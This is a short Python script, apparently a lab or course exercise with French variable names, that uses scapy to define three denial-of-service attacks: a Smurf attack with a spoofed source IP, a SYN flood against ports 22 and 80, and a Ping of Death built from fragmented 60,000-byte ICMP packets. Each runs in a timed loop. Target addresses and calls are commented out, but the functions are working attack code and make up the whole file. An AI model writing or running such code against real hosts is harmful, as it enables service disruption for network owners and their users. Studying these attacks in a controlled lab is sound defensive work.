import scapy.all as scapy
import time

# IP_Source = '10.0.2.16'
# IP_Dest = '192.168.86.213'


def Smurf_Attack(IP_Source, IP_Dest, duree):
    debut = time.time()
    while (time.time() - debut) < duree:
        scapy.send(scapy.IP(src=IP_Source, dst=IP_Dest)/scapy.ICMP())

def Syn_Flooding_Attack(IP_Dest, duree):
    topt=[('Timestamp', (10,0))]     
    p = scapy.IP(dst=IP_Dest,id=1111,ttl=99)/scapy.TCP(sport=scapy.RandShort(),dport=[22,80],seq=12345,ack=1000,window=1000,flags="S",options=topt)/"SYNFlood"
    debut = time.time()
    while (time.time() - debut) < duree:
        scapy.send(p)

def Ping_of_death(IP_Dest, duree):
    debut = time.time()
    while (time.time() - debut) < duree:
        scapy.send(scapy.fragment(scapy.IP(dst=IP_Dest)/scapy.ICMP()/('X' * 60000)))

# Smurf_Attack(IP_Source, IP_Dest, 10)
# Syn_Flooding_Attack(IP_Dest, 10)
# Ping_of_death(IP_Dest, 10)